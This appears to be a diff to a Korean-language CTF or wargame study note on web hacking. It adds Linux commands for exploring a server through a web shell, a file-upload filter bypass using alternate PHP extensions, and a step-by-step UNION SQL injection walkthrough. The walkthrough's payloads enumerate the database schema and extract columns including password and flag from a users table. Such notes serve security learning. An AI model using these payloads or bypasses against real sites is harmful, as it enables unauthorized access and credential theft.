@@ -462,6 +462,14 @@ Repeater는 수정된 요청을 서버로 반복적으로 전송하여 응답을
 - 웹 쉘이 올라가게 되면, 웹 브라우저만으로도 서버에 임의의 명령을 실행시킬 수 있다.
 - 파일 삭제, 페이지 변조, 추가 백도어(악성코드) 설치 등의 공격
 - 공격자가 웹 쉘에 접근가능할 때, 공격이 가능(RCE)
+
+**리눅스 명령어**
+ls: 디렉토리의 파일 list 출력 (ls -al)
+ls .. : 한 단계 위 디렉토리 파일 출력 (ls ../.. : 두 단계 위)
+cd : 디렉토리 변경 (cd ..   cd ../..   cd /var/log 등)
+pwd : 현재 디렉토리 위치 출력 (print working directory)
+cat : 실행 명령어 (cat 경로/파일명   ex) cat /var/log/access.log)
+find : 찾기 명령어 (  ex) find / -name flag.php   )
   
 **원격 코드 실행(RCE)이란?**
 
@@ -487,3 +495,45 @@ http://[웹 서버 주소]/[PHP 웹 쉘 경로]?cmd=[명령어]
 3번 문제의 연장선으로, 이번에는 확장자 필터링을 통해 .php 파일 업로드는 금지되었다.
 
 **시도해 볼 것**
+
+다른 확장자를 사용해보기(php5, php7, php4, phtml, phar)
+
+=====================================================================================
+
+### 5번 문제
+
+**UNION SQL Injection에서 기본 개념**
+
+Union 연산자: U
+
+- 결합되는 두 SELECT 문의 COLUMN(속성) 값이 동일해야함.
+
+- 컬럼 수가 동일하지 않으면 DB는 오류를 반환
+
+Union SQL Injection : 두 개의 SQL 문을 결합해서 만드는 SQL 공격
+
+- 보통 정상질의 뒤에 다른 악성질의를 결합해서 SQL 문을 주입
+
+<br>
+<br>
+
+1. 컬럼 수 확인 : 1, 2, 3, 4, #
+
+' UNION SELECT 1, 2, 3, 4 ; #
+
+2. DB 데이터베이스의 이름을 찾기 - DB 명: board
+
+' UNION SELECT 1, 2, schema_name, 4 from information_schema.schemata ; #
+
+3. Table 명 찾기 - Table 명 : users
+
+' UNION SELECT 1, 2, table_name, 4 FROM information_schema.tables WHERE table_schema = 'board' ; # (WHERE 절 DB에 있는 TABLE 질의 검색)
+
+4. 속성 명 찾기 - 속성명 : id, email, password, flag
+
+' UNION SELECT 1, 2, column_name, 4 FROM information_schema.columns WHERE table_name = 'users' ; #
+
+5. SQL 문: SELECT column명 FROM Table명
+
+') UNION SELECT 1, 2, flag, 4 FROM users ; #
+
